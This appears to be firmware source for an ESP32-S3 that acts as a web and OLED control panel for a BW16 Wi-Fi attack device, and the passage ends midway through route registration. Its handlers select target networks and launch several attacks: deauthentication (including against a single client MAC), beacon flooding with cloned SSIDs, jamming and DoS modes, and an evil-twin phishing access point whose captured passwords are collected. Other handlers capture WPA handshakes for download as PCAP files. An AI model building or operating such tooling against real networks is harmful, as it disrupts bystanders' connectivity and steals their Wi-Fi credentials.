// ============ ESP32-S3 控制中心 for BW16-Tools ============
// 家 WiFi 上的 Web 服务（端点与 BW16 原版 Web UI 同形，前端零改动复用）
// + UART 命令链路（见 bw16_link.h / bw16-firmware/serial_api.h）
// + OLED 菜单与 4 按键本地控制
// 端点 -> UART 命令翻译层全部在本文件 handleXxx 函数中

#include <WiFi.h>
#include <WebServer.h>
#include <ArduinoJson.h>
#include <mbedtls/base64.h>
#include <vector>
#include <cstdlib>

#include "config.h"
#include "web_admin.h"
#include "bw16_link.h"

// ---------- 共享状态（OLED 与 Web 共用） ----------
struct BwStatus {
  bool online;
  bool deauthRunning;
  unsigned long deauthPackets;
  bool beaconRunning;
  bool phishingRunning;
  bool jamming;
  bool bbh;
  bool dos;
  bool hsRunning;
  int targetCount;
  int scanCount;
  unsigned long heap;
  unsigned long uptime;
  unsigned long dbgP1;   // 诊断：BW16 processSingleAttack 调用计数
  unsigned long dbgP2;   // 诊断：BW16 processChannelBucketsEnhanced 调用计数
  unsigned long dbgP3;   // 诊断：BW16 发送函数调用计数
  unsigned long dbgP2a;  // 诊断：extras 分支进入次数
  unsigned long dbgP2b;  // 诊断：空桶跳过次数
  unsigned long dbgP2c;  // 诊断：非空桶发送次数
  unsigned long dbgAdv;  // 诊断：高级干扰(ci/bbh/dos)执行轮次
  unsigned long dbgLed;  // 诊断：BW16 updateLEDs 攻击分支执行次数
};
static BwStatus s_bw = {};
struct ScanItem {
  int id;
  String ssid;
  String bssid;
  int channel;
  int rssi;
  bool selected;
};
static std::vector<ScanItem> s_scanList;
static std::vector<int> s_selectedIds;  // 目标自动重同步：S3 记忆当前勾选集合（Web/OLED 勾选均经 selectTarget 同步）
static String s_phishCache = "[]";      // 钓鱼密码数组 JSON 缓存
static unsigned long s_phishTs = 0;
static String s_handshakeBssid = "";    // /handshake/select 选中的目标
static bool s_hsHasBssid = false;

// ---------- 前置声明（oled_ui.h 使用） ----------
static bool bw16RefreshStatus();
static bool triggerScan();
static void loadScanList();
static bool selectTarget(int id, bool sel);
static void attackDeauthSelected();
static void attackDeauthAll();
static void attackBeaconRandom();
static void attackBeaconClone();
static void attackCi();
static void attackBbh();
static void attackDos();
static void attackStopAll();
static unsigned long s_lastAttackStopMs = 0;   // 攻击停止时间戳（切换冷却用）
static void phishStart(int tmpl);
static void phishStop();
static void phishClear();
static void captureStart(const String& mode);
static void captureStop();
static void captureClear();
static JsonDocument g_uiDoc;   // OLED 动作用的重入文档

#include "buttons.h"
#include "oled_ui.h"

// ---------- Web 服务 ----------
static WebServer server(80);
static unsigned long s_statusTs = 0;
static String s_statusCache = "";
static String g_clientsCacheJson = "{\"count\":0,\"clients\":[]}";  // v25f 嗅探客户端缓存

// v25j 异步嗅探状态（嗅探期间 WebServer 不阻塞，loop 里收响应）
static bool g_sniffActive = false;
static bool g_sniffDone = false;
static bool g_sniffOk = false;
static unsigned long g_sniffDeadline = 0;
static unsigned long g_sniffStartMs = 0;
static String g_sniffReq = "";     // 待发送/已发送的命令串
static String g_sniffLineBuf = "";
static String g_sniffRespLine = "";
static String g_sniffError = "";

// URL 解码（处理表单里的 %XX 与 +）
static String urlDecode2(const String& s) {
  String o; o.reserve(s.length());
  for (unsigned int i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == '+' ) { o += ' '; continue; }
    if (c == '%' && i + 2 < s.length()) {
      char hex[3] = { s[i + 1], s[i + 2], 0 };
      o += (char)strtol(hex, nullptr, 16);
      i += 2;
      continue;
    }
    o += c;
  }
  return o;
}

// 统一取 POST body：兼容 text/plain（arg("plain")）与 application/x-www-form-urlencoded（form args 重建）
// ESP32 WebServer 的 arg("plain") 只在 text/plain 时填充；前端 fetch 用的是 form-urlencoded，必须重建
static String reqBody() {
  String body = server.arg("plain");   // 注意：此处必须是 arg("plain")，不能用 reqBody()（会无限递归）
  if (body.length() == 0 && server.args() > 0) {
    for (int i = 0; i < server.args(); i++) {
      if (i) body += "&";
      body += server.argName(i);
      body += "=";
      body += server.arg(i);
    }
  }
  return body;
}

// ---------- 状态刷新（1 秒缓存，Web 与 OLED 共用） ----------
static bool bw16RefreshStatus() {
  if (millis() - s_statusTs < 1000) return s_bw.online;
  s_statusTs = millis();
  JsonDocument d;
  if (!bw16Request("status", "", BW16_STATUS_TIMEOUT, d)) {
    s_bw.online = false;
    return false;
  }
  s_bw.online = true;
  s_bw.deauthRunning = d["deauth_running"] | false;
  s_bw.deauthPackets = d["deauth_packets"] | 0;
  // 串口 status 用 adv_attack 数字（0无 1CI 2BBH 3DOS 4随机信标 5克隆信标）
  s_bw.beaconRunning = d["beacon_attack"] | false;
  s_bw.phishingRunning = d["web_test_active"] | false;
  int adv = d["adv_attack"] | 0;
  s_bw.jamming = (adv == 1);
  s_bw.bbh = (adv == 2);
  s_bw.dos = (adv == 3);
  s_bw.hsRunning = d["sniffer_running"] | false;
  s_bw.targetCount = d["selected_count"] | 0;
  s_bw.scanCount = d["scan_count"] | 0;
  s_bw.heap = d["heap"] | 0;
  s_bw.uptime = d["uptime"] | 0;
  s_bw.dbgP1 = d["dbg_p1"] | 0;
  s_bw.dbgP2 = d["dbg_p2"] | 0;
  s_bw.dbgP3 = d["dbg_p3"] | 0;
  s_bw.dbgP2a = d["dbg_p2a"] | 0;
  s_bw.dbgP2b = d["dbg_p2b"] | 0;
  s_bw.dbgP2c = d["dbg_p2c"] | 0;
  s_bw.dbgAdv = d["dbg_adv"] | 0;
  s_bw.dbgLed = d["dbg_led"] | 0;
  return true;
}

// ---------- 扫描 ----------
static bool triggerScan() {
  JsonDocument d;
  bool ok = bw16Request("scan", "", BW16_SCAN_TIMEOUT, d);
  bool f = ok && (bool)(d["ok"] | false) && (int)(d["count"] | 0) > 0;
  if (!f) {  // v25k：扫描失败/为0 自动重扫一次
    Serial.println("[S3] scan retry once");
    delay(500);
    JsonDocument d2;
    ok = bw16Request("scan", "", BW16_SCAN_TIMEOUT, d2);
    f = ok && (bool)(d2["ok"] | false) && (int)(d2["count"] | 0) > 0;
  }
  return f;
}

static void loadScanList() {
  s_scanList.clear();
  // 分块拉取 scan_results（BW16 每块 6 条）；扫描刚结束时 BW16 忙，失败自动重试
  JsonDocument d;
  bool gotFirst = false;
  for (int attempt = 0; attempt < 3 && !gotFirst; attempt++) {
    if (attempt) delay(600);
    if (!bw16Request("scan_results", ",\"part\":0", BW16_TIMEOUT_MS, d)) continue;
    int total = d["total"] | 1;
    gotFirst = true;
    for (int p = 0; p < total; p++) {
      JsonDocument doc;
      bool ok = true;
      if (p != 0) ok = bw16Request("scan_results", String(",\"part\":") + String(p), BW16_TIMEOUT_MS, doc);
      JsonArrayConst items = (p == 0 ? d : doc)["items"].as<JsonArrayConst>();
      if (!ok || items.isNull()) continue;
      for (JsonObjectConst it : items) {
        ScanItem si;
        si.id = it["id"] | 0;
        si.ssid = String((const char*)(it["ssid"] | ""));
        si.bssid = String((const char*)(it["bssid"] | ""));
        si.channel = it["channel"] | 0;
        si.rssi = it["rssi"] | 0;
        si.selected = it["selected"] | false;
        s_scanList.push_back(si);
      }
    }
  }
}

static bool selectTarget(int id, bool sel) {
  String extra = String(",\"target\":") + String(id) + ",\"selected\":" + String(sel ? "true" : "false");
  JsonDocument d;
  bool ok = bw16Request("select", extra, BW16_TIMEOUT_MS, d);
  if (!ok) {   // 线路偶发噪声/半行污染会吃掉一条命令，重试一次即可自愈
    delay(120);
    ok = bw16Request("select", extra, BW16_TIMEOUT_MS, d);
  }
  Serial.print("[UARTDBG] selectTarget id=" + String(id) + " sel=" + String(sel ? 1 : 0) + " -> " + String(ok ? "OK" : "FAIL") + "\n");
  if (ok) {
    bw16RefreshStatus();
    bool found = false;
    for (size_t i = 0; i < s_selectedIds.size(); i++) if (s_selectedIds[i] == id) { found = true; break; }
    if (sel && !found) s_selectedIds.push_back(id);
    else if (!sel && found) {
      for (size_t i = 0; i < s_selectedIds.size(); i++)
        if (s_selectedIds[i] == id) { s_selectedIds.erase(s_selectedIds.begin() + i); break; }
    }
  }
  return ok;
}

// ---------- 目标自动重同步 ----------
// BW16 复位/崩溃后其 RAM 中的 SelectedVector 被清空，而网页/OLED 勾选状态仍在 S3 内存里。
// 执行攻击前把勾选集合重新注入 BW16：列表为空则自动重扫，扫描变化则过滤越界 id。
// 返回：0=同步成功；1=无目标可注入；2=BW16 离线；3=同步失败
static int resyncTargets() {
  if (!bw16RefreshStatus()) return 2;
  if (s_selectedIds.empty()) return 1;
  if (s_bw.scanCount == 0) {          // BW16 复位后扫描列表也空了，先自动重扫
    if (!triggerScan()) return 2;
    // 扫描是异步的：轮询等待 BW16 扫描完成（最多 8s），否则立即拉列表读到空
    unsigned long waitStart = millis();
    while (millis() - waitStart < 8000) {
      delay(300);
      s_statusTs = 0;                 // 绕过 bw16RefreshStatus 的 1s 缓存强制刷新
      if (bw16RefreshStatus() && s_bw.scanCount > 0) break;
    }
    loadScanList();
  }
  std::vector<int> valid;
  for (size_t i = 0; i < s_selectedIds.size(); i++) {
    int id = s_selectedIds[i];
    if (id >= 0 && id < s_bw.scanCount) valid.push_back(id);
  }
  if (valid.empty()) return 1;
  // 清空 BW16 旧选择后全量注入
  JsonDocument d;
  if (!bw16Request("select", ",\"clear\":true", BW16_TIMEOUT_MS, d)) return 3;
  for (size_t i = 0; i < valid.size(); i++) {
    if (!selectTarget(valid[i], true)) return 3;
  }
  // v23 修复：bw16RefreshStatus 有 1s 缓存，最后一步必须强制刷新，否则读到旧 targetCount 误判失败
  // （此前误判 rs==3 导致 ci/deauth 命令被截断从未发给 BW16：LED 不闪、无效果）
  s_statusTs = 0;
  if (!bw16RefreshStatus()) return 2;
  return (s_bw.targetCount == (int)valid.size()) ? 0 : 3;
}

// ---------- 动作函数（Web 与 OLED 共用） ----------
static void attackDeauthSelected() { if (resyncTargets() != 0) return; JsonDocument d; bw16Request("deauth", ",\"mode\":\"single\"", BW16_TIMEOUT_MS, d); }
static void attackDeauthAll()      { JsonDocument d; bw16Request("deauth", ",\"mode\":\"all\"", BW16_TIMEOUT_MS, d); }
static void attackBeaconRandom()   { JsonDocument d; bw16Request("beacon", ",\"type\":\"random\"", BW16_TIMEOUT_MS, d); }
static void attackBeaconClone()    { if (resyncTargets() != 0) return; JsonDocument d; bw16Request("beacon", ",\"type\":\"clone\"", BW16_TIMEOUT_MS, d); }
static void attackCi()             { if (resyncTargets() != 0) return; JsonDocument d; bw16Request("ci", "", BW16_TIMEOUT_MS, d); }
static void attackBbh()            { if (resyncTargets() != 0) return; JsonDocument d; bw16Request("bbh", "", BW16_TIMEOUT_MS, d); }
static void attackDos()            { if (resyncTargets() != 0) return; JsonDocument d; bw16Request("dos", "", BW16_TIMEOUT_MS, d); }
static void attackStopAll()        { JsonDocument d; bw16Request("stop", "", BW16_TIMEOUT_MS, d); s_lastAttackStopMs = millis(); }

// 攻击切换冷却：BW16 的 Realtek 驱动在 stop（切回 WebUI 信道）后立即再启动攻击可能死机，
// 攻击间强制等待 1.2s，让 RF 状态稳定后再发新攻击命令。
static void attackCooldown() {
  unsigned long elapsed = millis() - s_lastAttackStopMs;
  if (elapsed < 1200) delay(1200 - elapsed);
}

static void phishStart(int tmpl) {
  // 有选中目标时用其 SSID 作为钓鱼热点名
  String ssid = "";
  if (!s_scanList.empty()) {
    for (auto& it : s_scanList) if (it.selected) { ssid = it.ssid; break; }
  }
  String extra = ",\"template\":" + String(tmpl);
  if (ssid.length()) extra += ",\"ssid\":\"" + ssid + "\"";
  JsonDocument d;
  bw16Request("phishing", extra, 20000, d);   // startWebTest 最多 15s
}
static void phishStop()            { JsonDocument d; bw16Request("stop", "", BW16_TIMEOUT_MS, d); }
static void phishClear()           { JsonDocument d; bw16Request("phish_clear", "", BW16_TIMEOUT_MS, d); }

static void captureStart(const String& mode) {
  // 用第一个选中目标的 bssid（与 Web 前端一致：先 select 再 capture）
  String bssid = "";
  for (auto& it : s_scanList) if (it.selected) { bssid = it.bssid; break; }
  if (bssid.length() == 0) return;
  String extra = ",\"bssid\":\"" + bssid + "\",\"mode\":\"" + mode + "\"";
  JsonDocument d;
  bw16Request("capture", extra, BW16_TIMEOUT_MS, d);
}
static void captureStop()          { JsonDocument d; bw16Request("capture_stop", "", BW16_TIMEOUT_MS, d); }
static void captureClear()         { JsonDocument d; bw16Request("capture_clear", "", BW16_TIMEOUT_MS, d); }

// ---------- Web 端点处理器 ----------
static void hRoot() { server.send(200, "text/html", WEB_ADMIN_HTML); }

static void hStatus() {
  if (!g_sniffActive) bw16RefreshStatus();   // 嗅探期间用缓存，不触发同步命令
  String j = "{";
  j += "\"ap_running\":" + String(s_bw.online ? "true" : "false");   // 前端用作 BW16 在线指示
  j += ",\"bw16_online\":" + String(s_bw.online ? "true" : "false");
  j += ",\"free_heap\":" + String(s_bw.online ? (long)s_bw.heap : 0);
  j += ",\"uptime\":" + String((long)s_bw.uptime);
  j += ",\"deauth_running\":" + String(s_bw.deauthRunning ? "true" : "false");
  j += ",\"deauth_packets\":" + String((long)s_bw.deauthPackets);
  j += ",\"beacon_running\":" + String(s_bw.beaconRunning ? "true" : "false");
  j += ",\"phishing_running\":" + String(s_bw.phishingRunning ? "true" : "false");
  j += ",\"jamming_running\":" + String(s_bw.jamming ? "true" : "false");
  j += ",\"bbh_running\":" + String(s_bw.bbh ? "true" : "false");
  j += ",\"dos_running\":" + String(s_bw.dos ? "true" : "false");
  j += ",\"handshake_running\":" + String(s_bw.hsRunning ? "true" : "false");
  j += ",\"target_count\":" + String(s_bw.targetCount);
  j += ",\"scan_count\":" + String(s_bw.scanCount);
  j += ",\"dbg_p1\":" + String((long)s_bw.dbgP1);
  j += ",\"dbg_p2\":" + String((long)s_bw.dbgP2);
  j += ",\"dbg_p3\":" + String((long)s_bw.dbgP3);
  j += ",\"dbg_p2a\":" + String((long)s_bw.dbgP2a);
  j += ",\"dbg_p2b\":" + String((long)s_bw.dbgP2b);
  j += ",\"dbg_p2c\":" + String((long)s_bw.dbgP2c);
  j += ",\"dbg_adv\":" + String((long)s_bw.dbgAdv);
  j += ",\"dbg_led\":" + String((long)s_bw.dbgLed);
  j += "}";
  server.send(200, "application/json", j);
}

static void hScan() {   // POST
  bool ok = triggerScan();
  int cnt = ok ? (int)s_bw.scanCount : 0;
  loadScanList();
  cnt = (int)s_scanList.size();
  server.send(200, "application/json", String("{\"success\":") + (ok ? "true" : "false") + ",\"count\":" + String(cnt) + "}");
}

static void hScanResults() {  // GET：聚合分块为完整数组（形状与 BW16 原版一致）
  loadScanList();
  String j = "[";
  for (size_t i = 0; i < s_scanList.size(); i++) {
    if (i) j += ",";
    const ScanItem& it = s_scanList[i];
    j += "{\"id\":" + String(it.id);
    j += ",\"ssid\":\"" + it.ssid + "\"";
    j += ",\"bssid\":\"" + it.bssid + "\"";
    j += ",\"channel\":" + String(it.channel);
    j += ",\"rssi\":" + String(it.rssi);
    j += ",\"security\":0";
    j += ",\"selected\":" + String(it.selected ? "true" : "false") + "}";
  }
  j += "]";
  server.send(200, "application/json", j);
}

static void hTargetsSelect() {  // POST: all=1 | clear=1 | id=N&selected=1
  String body = reqBody();
  bool ok = false;
  int selCount = 0;
  if (body.indexOf("all=1") >= 0) {
    loadScanList();
    s_selectedIds.clear();
    for (auto& it : s_scanList) selectTarget(it.id, true);
    ok = true;
    selCount = (int)s_scanList.size();
  } else if (body.indexOf("clear=1") >= 0) {
    s_selectedIds.clear();   // 无条件清本地记忆（不依赖 BW16 当前状态）
    JsonDocument d;
    bw16Request("select", ",\"clear\":true", BW16_TIMEOUT_MS, d);
    ok = true;
  } else {
    int idPos = body.indexOf("id=");
    if (idPos >= 0) {
      int amp = body.indexOf('&', idPos);
      int id = body.substring(idPos + 3, amp >= 0 ? amp : body.length()).toInt();
      bool sel = (body.indexOf("selected=1") >= 0);
      loadScanList();
      ok = selectTarget(id, sel);
    }
  }
  bw16RefreshStatus();
  selCount = s_bw.targetCount;
  server.send(200, "application/json", String("{\"success\":") + (ok ? "true" : "false") + ",\"selected_count\":" + String(selCount) + "}");
}

static void hClientsScan() {  // POST /api/clients/scan —— 异步发起嗅探，立即返回
  attackCooldown();
  int rs = resyncTargets();
  if (rs == 1) { server.send(200, "application/json", "{\"success\":false,\"message\":\"请先在扫描页勾选目标\"}"); return; }
  if (rs == 2) { server.send(200, "application/json", "{\"success\":false,\"message\":\"BW16 离线，请按 BW16 复位键\"}"); return; }
  if (rs == 3) { server.send(200, "application/json", "{\"success\":false,\"message\":\"目标同步失败，请重试\"}"); return; }
  if (g_sniffActive) { server.send(200, "application/json", "{\"success\":false,\"message\":\"抓包进行中，请等待完成\"}"); return; }
  String body = reqBody();
  String extra = "";
  int s = body.indexOf("sec=");
  if (s >= 0) {
    int amp = body.indexOf('&', s);
    extra += ",\"sec\":" + body.substring(s + 4, amp >= 0 ? amp : body.length());
  }
  if (body.indexOf("induce=1") >= 0) extra += ",\"induce\":1";
  int id = ++g_bw16Seq;
  g_sniffReq = String("{\"cmd\":\"sniff\",\"id\":") + String(id) + extra + "}";
  g_sniffActive = true;
  g_sniffDone = false;
  g_sniffOk = false;
  g_sniffError = "";
  g_sniffLineBuf = "";
  g_sniffRespLine = "";
  g_sniffStartMs = millis();
  // 诱导模式总耗时 = 踢 4s + 切模式 ~5s + 嗅探秒数 → 超时放宽到 75s；否则 40s
  g_sniffDeadline = g_sniffStartMs + ((body.indexOf("induce=1") >= 0) ? 75000 : 40000);
  g_bw16Busy = true;
  bw16DrainInput();
  Serial1.print(g_sniffReq);
  Serial1.print('\n');
  Serial1.flush();
  server.send(200, "application/json", "{\"success\":true,\"started\":true}");
}

// loop 里调用：非阻塞收嗅探响应
static void pollSniff() {
  while (Serial1.available()) {
    char c = (char)Serial1.read();
    if (c == '\r') continue;
    if (c == '\n') {
      if (g_sniffLineBuf.length() == 0) continue;
      String line = g_sniffLineBuf;
      g_sniffLineBuf = "";
      JsonDocument doc;
      if (deserializeJson(doc, line) != DeserializationError::Ok) continue;  // 噪声行
      if (doc["rsp"] == "sniff") {
        g_sniffRespLine = line;
        g_sniffOk = true;
        g_sniffDone = true;
        return;
      }
      // 其它响应（理论上嗅探期间不会有）忽略
    } else {
      g_sniffLineBuf += c;
      if (g_sniffLineBuf.length() > 8192) g_sniffLineBuf = "";
    }
  }
  if (millis() > g_sniffDeadline) {
    g_sniffOk = false;
    g_sniffError = "抓包超时";
    g_sniffDone = true;
  }
}

// 嗅探完成后的缓存写入（loop 里调用）
static void finalizeSniff() {
  g_bw16Busy = false;
  if (g_sniffOk) {
    JsonDocument d;
    if (deserializeJson(d, g_sniffRespLine) == DeserializationError::Ok) {
      g_clientsCacheJson = "{\"count\":" + String((int)(d["count"] | 0)) + ",\"clients\":[";
      JsonArray arr = d["clients"].as<JsonArray>();
      bool first = true;
      for (JsonObject c : arr) {
        if (!first) g_clientsCacheJson += ",";
        first = false;
        g_clientsCacheJson += "{\"mac\":\"" + String((const char*)(c["mac"] | ""))
                            + "\",\"rssi\":" + String((int)(c["rssi"] | 0))
                            + ",\"frames\":" + String((int)(c["frames"] | 0)) + "}";
      }
      g_clientsCacheJson += "]}";
    } else {
      g_clientsCacheJson = "{\"count\":0,\"clients\":[],\"error\":\"响应解析失败\"}";
    }
  } else {
    g_clientsCacheJson = "{\"count\":0,\"clients\":[],\"error\":\"" + g_sniffError + "\"}";
  }
  g_sniffActive = false;
  g_sniffDone = false;
}

static void hClientsGet() {  // GET /api/clients —— 最近一次嗅探结果 / 抓包进度
  if (g_sniffActive) {
    int el = (millis() - g_sniffStartMs) / 1000;
    server.send(200, "application/json",
      String("{\"success\":true,\"busy\":true,\"progress\":" + String(el) + ",\"result\":{\"count\":0,\"clients\":[]}}"));
    return;
  }
  server.send(200, "application/json", String("{\"success\":true,\"busy\":false,\"result\":") + g_clientsCacheJson + "}");
}

static void hDeauthStart() {  // POST: mode=&packets=&enhanced=1
  attackCooldown();
  String body = reqBody();
  String mode = "single";
  int m = body.indexOf("mode=");
  if (m >= 0) { int amp = body.indexOf('&', m); mode = body.substring(m + 5, amp >= 0 ? amp : body.length()); }
  // 单目标/多目标模式需要 BW16 侧有目标：执行前自动重同步（BW16 复位后选择会被清空）
  if (mode != "all") {
    int rs = resyncTargets();
    if (rs == 1) { server.send(200, "application/json", "{\"success\":false,\"message\":\"请先在扫描页勾选目标\"}"); return; }
    if (rs == 2) { server.send(200, "application/json", "{\"success\":false,\"message\":\"BW16 离线，请按 BW16 复位键\"}"); return; }
    if (rs == 3) { server.send(200, "application/json", "{\"success\":false,\"message\":\"目标同步失败，请重试\"}"); return; }
  }
  String extra = ",\"mode\":\"" + mode + "\"";
  int p = body.indexOf("packets=");
  if (p >= 0) {
    int amp = body.indexOf('&', p);
    extra += ",\"packets\":" + body.substring(p + 8, amp >= 0 ? amp : body.length());
  }
  if (body.indexOf("enhanced=1") >= 0) extra += ",\"enhanced\":true";
  // v25e：可选定向客户端 MAC（单播 deauth）
  int cm = body.indexOf("client_mac=");
  if (cm >= 0) {
    int amp = body.indexOf('&', cm);
    String mac = body.substring(cm + 11, amp >= 0 ? amp : body.length());
    if (mac.length() >= 17) extra += ",\"clientMac\":\"" + mac + "\"";
  }
  JsonDocument d;
  bool ok = bw16Request("deauth", extra, BW16_TIMEOUT_MS, d);
  bool okFlag = ok && (bool)(d["ok"] | false);
  String msg = okFlag ? "Deauth started" : String((const char*)(d["message"] | "Deauth failed"));
  server.send(200, "application/json", String("{\"success\":") + (okFlag ? "true" : "false") + ",\"message\":\"" + msg + "\"}");
}

static void hBeaconStart() {  // POST: type=&band=&ssid=
  attackCooldown();
  String body = reqBody();
  String type = "custom";
  int t = body.indexOf("type=");
  if (t >= 0) { int amp = body.indexOf('&', t); type = body.substring(t + 5, amp >= 0 ? amp : body.length()); }
  String extra = ",\"type\":\"" + type + "\"";
  int b = body.indexOf("band=");
  if (b >= 0) { int amp = body.indexOf('&', b); extra += ",\"band\":\"" + body.substring(b + 5, amp >= 0 ? amp : body.length()) + "\""; }
  int s = body.indexOf("ssid=");
  if (s >= 0) {
    int amp = body.indexOf('&', s);
    String ssid = urlDecode2(body.substring(s + 5, amp >= 0 ? amp : body.length()));
    if (ssid.length()) extra += ",\"ssid\":\"" + ssid + "\"";
  }
  // clone 类型需要目标：执行前自动重同步
  if (type == "clone") {
    int rs = resyncTargets();
    if (rs == 1) { server.send(200, "application/json", "{\"success\":false,\"message\":\"请先在扫描页勾选目标\"}"); return; }
    if (rs == 2) { server.send(200, "application/json", "{\"success\":false,\"message\":\"BW16 离线，请按 BW16 复位键\"}"); return; }
    if (rs == 3) { server.send(200, "application/json", "{\"success\":false,\"message\":\"目标同步失败，请重试\"}"); return; }
  }
  JsonDocument d;
  bool ok = bw16Request("beacon", extra, BW16_TIMEOUT_MS, d);
  bool okFlag = ok && (bool)(d["ok"] | false);
  String msg = okFlag ? "Beacon started" : String((const char*)(d["message"] | "Beacon failed"));
  server.send(200, "application/json", String("{\"success\":") + (okFlag ? "true" : "false") + ",\"message\":\"" + msg + "\"}");
}

static void hAdvAttack() {  // POST /api/ci/start 等
  attackCooldown();
  String path = server.uri();
  String cmd = (path.indexOf("/ci/") >= 0) ? "ci" : (path.indexOf("/bbh/") >= 0) ? "bbh" : "dos";
  int rs = resyncTargets();
  if (rs == 1) { server.send(200, "application/json", "{\"success\":false,\"message\":\"请先在扫描页勾选目标\"}"); return; }
  if (rs == 2) { server.send(200, "application/json", "{\"success\":false,\"message\":\"BW16 离线，请按 BW16 复位键\"}"); return; }
  if (rs == 3) { server.send(200, "application/json", "{\"success\":false,\"message\":\"目标同步失败，请重试\"}"); return; }
  JsonDocument d;
  bool ok = bw16Request(cmd.c_str(), "", BW16_TIMEOUT_MS, d);
  bool okFlag = ok && (bool)(d["ok"] | false);
  String msg = okFlag ? "started" : String((const char*)(d["message"] | "命令执行失败"));
  server.send(200, "application/json", String("{\"success\":") + (okFlag ? "true" : "false") + ",\"message\":\"" + msg + "\"}");
}

static void hStop() {  // POST /stop /api/stop /api/deauth/stop
  attackStopAll();
  server.send(200, "application/json", "{\"success\":true,\"message\":\"stopped\"}");
}

static void hReboot() {  // POST /api/reboot
  JsonDocument d;
  bw16Request("reboot", "", BW16_TIMEOUT_MS, d);
  server.send(200, "application/json", "{\"success\":true}");
}

static void hPhishingStart() {  // POST: template=&ssid=
  attackCooldown();
  String body = reqBody();
  int tmpl = 1;
  if (body.indexOf("template=2") >= 0) tmpl = 2;
  String extra = ",\"template\":" + String(tmpl);
  int s = body.indexOf("ssid=");
  if (s >= 0) {
    int amp = body.indexOf('&', s);
    String ssid = urlDecode2(body.substring(s + 5, amp >= 0 ? amp : body.length()));
    if (ssid.length()) extra += ",\"ssid\":\"" + ssid + "\"";
  }
  JsonDocument d;
  bool ok = bw16Request("phishing", extra, 20000, d);
  server.send(200, "application/json", String("{\"success\":") + (ok ? "true" : "false") + ",\"message\":\"Phishing started\"}");
}

static void hPhishPasswords() {  // GET：聚合分块
  if (millis() - s_phishTs > 1500) {
    s_phishTs = millis();
    JsonDocument d;
    if (!bw16Request("phish_passwords", ",\"part\":0", BW16_TIMEOUT_MS, d)) { server.send(200, "application/json", s_phishCache); return; }
    int total = d["total"] | 1;
    String items = "[";
    bool first = true;
    for (int p = 0; p < total; p++) {
      JsonDocument doc;
      bool ok = true;
      if (p != 0) ok = bw16Request("phish_passwords", String(",\"part\":") + String(p), BW16_TIMEOUT_MS, doc);
      JsonArrayConst arr = (p == 0 ? d : doc)["items"].as<JsonArrayConst>();
      if (!ok || arr.isNull()) continue;
      for (JsonVariantConst v : arr) {
        if (!first) items += ",";
        first = false;
        serializeJson(v, items);
      }
    }
    items += "]";
    s_phishCache = items;
  }
  server.send(200, "application/json", s_phishCache);
}

static void hPhishClear() {
  phishClear();
  s_phishCache = "[]";
  server.send(200, "application/json", "{\"success\":true}");
}

// ---- 握手抓包端点 ----
static void hHsSelect() {  // POST /handshake/select?bssid=XX 或 body bssid=
  String bssid = "";
  String uri = server.uri();
  int q = uri.indexOf('?');
  if (q >= 0) {
    String qs = uri.substring(q + 1);
    int p = qs.indexOf("bssid=");
    if (p >= 0) bssid = qs.substring(p + 6);
  }
  if (bssid.length() == 0) {
    String body = reqBody();
    int p = body.indexOf("bssid=");
    if (p >= 0) bssid = urlDecode2(body.substring(p + 6));
  }
  s_handshakeBssid = bssid;
  s_hsHasBssid = (bssid.length() > 0);
  server.send(200, "text/plain", "");
}

static void hHsCapture() {  // POST: mode=
  if (!s_hsHasBssid) { server.send(200, "text/plain", ""); return; }
  String mode = "active";
  String body = reqBody();
  int m = body.indexOf("mode=");
  if (m >= 0) { int amp = body.indexOf('&', m); mode = urlDecode2(body.substring(m + 5, amp >= 0 ? amp : body.length())); }
  String extra = ",\"bssid\":\"" + s_handshakeBssid + "\",\"mode\":\"" + mode + "\"";
  JsonDocument d;
  bw16Request("capture", extra, BW16_TIMEOUT_MS, d);
  server.send(200, "text/plain", "");
}

static void hHsStatus() {  // GET
  JsonDocument d;
  if (!bw16Request("capture_status", "", BW16_STATUS_TIMEOUT, d)) {
    server.send(200, "application/json", "{\"running\":false,\"captured\":false,\"hsCount\":0,\"mgmtCount\":0,\"pcapSize\":0}");
    return;
  }
  String j = "{";
  j += "\"running\":" + String((bool)(d["running"] | false) ? "true" : "false");
  j += ",\"captured\":" + String((bool)(d["captured"] | false) ? "true" : "false");
  j += ",\"justCaptured\":" + String((bool)(d["justCaptured"] | false) ? "true" : "false");
  j += ",\"hsCount\":" + String((unsigned long)(d["hsCount"] | 0));
  j += ",\"mgmtCount\":" + String((unsigned long)(d["mgmtCount"] | 0));
  j += ",\"pcapSize\":" + String((unsigned long)(d["pcapSize"] | 0));
  j += "}";
  server.send(200, "application/json", j);
}

static void hHsStop() {  // POST
  captureStop();
  server.send(200, "text/plain", "");
}

static void hHsDownload() {  // GET：PCAP 流式转发（分块拉取、边收边发，不占大内存）
  server.setContentLength(CONTENT_LENGTH_UNKNOWN);
  server.send(200, "application/octet-stream", "");
  JsonDocument d;
  if (!bw16Request("capture_data", ",\"part\":0", BW16_TIMEOUT_MS, d)) { server.sendContent(""); return; }
  int total = d["total"] | 1;
  for (int p = 0; p < total; p++) {
    JsonDocument doc;
    bool ok = true;
    if (p != 0) ok = bw16Request("capture_data", String(",\"part\":") + String(p), BW16_TIMEOUT_MS, doc);
    const char* b64 = (p == 0 ? d : doc)["data"] | "";
    if (!ok || !*b64) continue;
    size_t b64len = strlen(b64);
    uint8_t out[BW16_PCAP_CHUNK_DEC];   // 解码缓冲（BW16 每块 1024 字节原文）
    size_t olen = 0;
    if (mbedtls_base64_decode(out, sizeof(out), &olen, (const uint8_t*)b64, b64len) == 0 && olen) {
      server.sendContent((const char*)out, olen);
    }
  }
  server.sendContent("");   // 结束分块
}

// ---------- setup / loop ----------
static void webSetup() {
  server.on("/", HTTP_GET, hRoot);
  server.on("/index.html", HTTP_GET, hRoot);
  server.on("/api/status", HTTP_GET, hStatus);
  server.on("/api/scan", HTTP_POST, hScan);
  server.on("/api/scan-results", HTTP_GET, hScanResults);
  server.on("/api/targets/select", HTTP_POST, hTargetsSelect);
  server.on("/api/deauth/start", HTTP_POST, hDeauthStart);
  server.on("/api/clients/scan", HTTP_POST, hClientsScan);   // v25f 嗅探客户端
  server.on("/api/clients", HTTP_GET, hClientsGet);
  server.on("/api/beacon/start", HTTP_POST, hBeaconStart);
  server.on("/api/ci/start", HTTP_POST, hAdvAttack);
  server.on("/api/bbh/start", HTTP_POST, hAdvAttack);
  server.on("/api/dos/start", HTTP_POST, hAdvAttack);
  server.on("/api/stop", HTTP_POST, hStop);
  server.on("/stop", HTTP_POST, hStop);
  server.on("/api/deauth/stop", HTTP_POST, hStop);
